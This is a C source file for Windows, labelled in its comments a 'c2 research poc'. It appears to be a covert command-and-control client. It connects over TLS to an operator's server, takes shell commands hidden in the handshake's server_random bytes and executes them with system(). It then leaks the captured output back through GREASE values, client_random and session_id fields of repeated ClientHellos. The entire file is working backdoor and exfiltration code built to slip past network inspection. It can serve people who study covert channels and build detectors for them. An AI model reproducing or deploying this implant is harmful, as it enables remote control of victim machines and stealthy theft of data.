#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <fcntl.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib") 
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define BLOCK_SIZE 32
#define NUM_GREASE_VALUES 16

//valid grease values
static const uint16_t grease_values[NUM_GREASE_VALUES] = {
  0x0a0a,0x1a1a,0x2a2a,0x3a3a,0x4a4a,0x5a5a,0x6a6a,0x7a7a,
  0x8a8a,0x9a9a,0xaaaa,0xbaba,0xcaca,0xdada,0xeaea,0xfafa
};

//choose a grease value, per RFC unique per field in clientHello
void shuffle_grease(uint16_t *values, int n) {
  for (int i = n - 1; i > 0; i--) {
    int j = rand() % (i + 1);
    uint16_t tmp = values[i];
    values[i] = values[j];
    values[j] = tmp;
  }
}

void craft_grease_value(unsigned char nibble, uint16_t *result){
  if (nibble >= NUM_GREASE_VALUES) {
    printf("[-] invalid nibble value. must be between 0 and 15.\n");
  }
  *result = grease_values[nibble];
}

int main(int argc, char *argv[]){
  if ((argc < 4) || (argc > 6)) {
    printf("usage: %s <ip> <port> <switches>\n", argv[0]);
    printf("switches: \n-g = grease\n-r = client_random\n-s = session_id\n");
    printf("example: client.exe 192.168.1.100 1234 -g -r -s\n");
    return 1;
  }

  const char *host = argv[1];
  int port = atoi(argv[2]);

  if (port <= 0 || port > 65535) {
    printf("[-] invalid port number\n");
    return 1;
  }

  BOOL read_g = FALSE, read_r = FALSE, read_s = FALSE;
  for (int i = 2; i < argc; i++) {
    if (strcmp(argv[i], "-g") == 0) read_g = TRUE;
    else if (strcmp(argv[i], "-r") == 0) read_r = TRUE;
    else if (strcmp(argv[i], "-s") == 0) read_s = TRUE;
  }

  if (!read_g && !read_r && !read_s) {
    printf("[-] no valid switches provided, use any of: -g -r -s\n");
    return 1;
  }

  unsigned char bytegrease;
  unsigned char blockrandom[BLOCK_SIZE];
  unsigned char blocksessionid[BLOCK_SIZE];
  WSADATA wsaData;
  SOCKET sock;
  struct sockaddr_in addr;
  char buffer[1];

  srand((unsigned int)time(NULL)); 

  if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0){
    printf("[-] winsock initialization failed, error: %d\n", WSAGetLastError());
    return 1;
  }

  OPENSSL_init_ssl(0, NULL); //resolve le applink issues
  SSL_library_init();
  SSL_load_error_strings();
  OpenSSL_add_all_algorithms();

  const SSL_METHOD *method = TLS_client_method();
  SSL_CTX *ctx = SSL_CTX_new(method);
  if (!ctx) {
    printf("[-] error creating ssl context\n");
    ERR_print_errors_fp(stderr);
    WSACleanup();
    return 1;
  }

  SSL *ssl = NULL;  //ssl variable haz to be scoped outside the loop
  char outputBuffer[4096] = {0}; //populated after system()
  
  while (1) {
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
      printf("[-] socket creation failed, error: %d\n", WSAGetLastError());
      SSL_CTX_free(ctx);
      WSACleanup();
      return 1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    unsigned long ip_addr = inet_addr(host);
    if (ip_addr != INADDR_NONE) {
      addr.sin_addr.s_addr = ip_addr;
    } else {
      printf("[-] Invalid IP address: %s\n", host);
      };

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
      printf("[-] Connection to %s:%d failed.\n", host, port);
      closesocket(sock);
      WSACleanup();
      return 1;
    }

    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
      printf("[-] SSL object creation failed\n");
      ERR_print_errors_fp(stderr);
      closesocket(sock);
      SSL_CTX_free(ctx);
      WSACleanup();
      return 1;
    }
    SSL_set_grease_enabled(ssl, 1);
    SSL_set_fd(ssl, (int)sock);

    // logic if -g was used
    if (read_g) {
      if (outputBuffer[0] == 0) {
        bytegrease = 0xff; //default
        Sleep(3000); //bad placement but it werks hehe
      } else {
        bytegrease = outputBuffer[0];
        memmove(outputBuffer, outputBuffer + 1, sizeof(outputBuffer) - 1); //remove the read byte from the buffer
      }
    }

    //store the character being sent, its high and low nibble
    unsigned char highNibble = (bytegrease >> 4) & 0x0F; 
    unsigned char lowNibble = bytegrease & 0x0F;

    //set grease crafted value for ciphersuite and supported_groups
    uint16_t grease_cipher;
    craft_grease_value(highNibble, &grease_cipher);
    uint16_t grease_group;
    craft_grease_value(lowNibble, &grease_group);

    //shuffle GREASE values
    uint16_t grease_pool[NUM_GREASE_VALUES];
    memcpy(grease_pool, grease_values, sizeof(grease_values));
    shuffle_grease(grease_pool, NUM_GREASE_VALUES);

    //assign shuffled grease values only to supported_versions
    uint16_t grease_version = grease_pool[0];
    //the grease for group and cipher passed from command buffer, legacy assignment
    //uint16_t grease_group = grease_pool[1];
    //uint16_t grease_cipher = grease_pool[2];

    //set grease values 
    SSL_set_grease_cipher(ssl, grease_cipher);    
    SSL_set_grease_group(ssl, grease_group);
    SSL_set_grease_version(ssl, grease_version);

    //client random from default or buffer
    if (read_r) {
      if(outputBuffer[0] == 0) {
        memset(blockrandom, 0xfc, BLOCK_SIZE);
        Sleep(3000);
      } else {
        memcpy(blockrandom, outputBuffer, BLOCK_SIZE);
        memmove(outputBuffer, outputBuffer + BLOCK_SIZE, sizeof(outputBuffer) - BLOCK_SIZE);
      }
    }

    if (!SSL_set_client_random(ssl, blockrandom, BLOCK_SIZE)) {
      printf("[-] failed to set client_random\n");
      ERR_print_errors_fp(stderr);
      SSL_free(ssl);
      closesocket(sock);
      SSL_CTX_free(ctx);
      WSACleanup();
      return 1;
    }

    //sid from default or buffer
    if(read_s) {
      if(outputBuffer[0] == 0) {
        memset(blocksessionid, 0x00, BLOCK_SIZE);
        Sleep(3000);
      } else {
        memcpy(blocksessionid, outputBuffer, BLOCK_SIZE);
        memmove(outputBuffer, outputBuffer + BLOCK_SIZE, sizeof(outputBuffer) - BLOCK_SIZE);
      }
    }

    if (!SSL_set_client_hello_session_id(ssl, blocksessionid, BLOCK_SIZE)) {
      printf("[-] failed to set custom client session ID\n");
      ERR_print_errors_fp(stderr);
      SSL_free(ssl);
      closesocket(sock);
      SSL_CTX_free(ctx);
      WSACleanup();
      return 1;
    }

    if (SSL_connect(ssl) <= 0) {
      printf("[-] tls handshake failed\n");
      ERR_print_errors_fp(stderr);
      SSL_free(ssl);
      closesocket(sock);
      SSL_CTX_free(ctx);
      WSACleanup();
      return 1;
    }

    /*start c2 research poc*/
    unsigned char server_random[BLOCK_SIZE];
    unsigned char custom_server_random[BLOCK_SIZE];
    SSL_get_server_random(ssl, server_random, BLOCK_SIZE);

    //check if server_random is default or a command to execute
    int is_default = 1; 
    for (int i = 0; i < 16; i++) {
      if (server_random[i] != 0xFD) {
        is_default = 0;
        break;
      }
    }

    if (!is_default) {
      memcpy(custom_server_random, server_random, BLOCK_SIZE);

      printf("[+] command from server_random: ");
      char cmd_str[BLOCK_SIZE + 1] = {0};

      int i;
      for (i = 0; i < BLOCK_SIZE; i++) {
        if (custom_server_random[i] == 0x00) {
          break;
        }
        if (custom_server_random[i] >= 32 && custom_server_random[i] <= 126) {
          printf("%c", custom_server_random[i]);
          cmd_str[i] = custom_server_random[i];
        } else {
          printf(".");
        }
      }
      printf("\n");

      //stdout redirection to pipe
      HANDLE hRead, hWrite;
      SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

      if(CreatePipe(&hRead, &hWrite, &sa, 0)) {
        int stdout_fd = _dup(_fileno(stdout));
        int pipe_fd = _open_osfhandle((intptr_t)hWrite, _O_WRONLY);
        _dup2(pipe_fd, _fileno(stdout));

        system(cmd_str);

        fflush(stdout); 
        _dup2(stdout_fd, _fileno(stdout));
        close(pipe_fd);

        //read execution output from the pipe
        DWORD stdoutBytesRead;
        if(ReadFile(hRead, outputBuffer, sizeof(outputBuffer) - 1, &stdoutBytesRead, NULL)) {
          outputBuffer[stdoutBytesRead] = '\0';
          printf("[+] stdout from system():\n%s\n", outputBuffer);
          //printf("%s\n", outputBuffer);
        } else {
          printf("[-] failed to read from stdout pipe\n");
        }
        CloseHandle(hRead);
        _close(stdout_fd);
      } else {
        printf("[-] failed to create pipe for stdout capture\n");
      }
    }
    /*end c2 research poc*/

    if (SSL_write(ssl, buffer, 1) <= 0) { //must write at least 1 byte
      printf("[-] SSL_write() failed\n");
      ERR_print_errors_fp(stderr);
      SSL_shutdown(ssl);
      SSL_free(ssl);
      closesocket(sock);
      SSL_CTX_free(ctx);
      WSACleanup();
      return 1;
    }
    SSL_shutdown(ssl);
    SSL_free(ssl);
  }
  SSL_shutdown(ssl); // stops err 807215C5657F0000:error:0A000126:SSL routines::unexpected eof while reading:ssl/record/rec_layer_s3.c:696
  closesocket(sock);
  SSL_CTX_free(ctx);
  WSACleanup();
  printf("[-] disconnected from the server\n");
  return 0;
}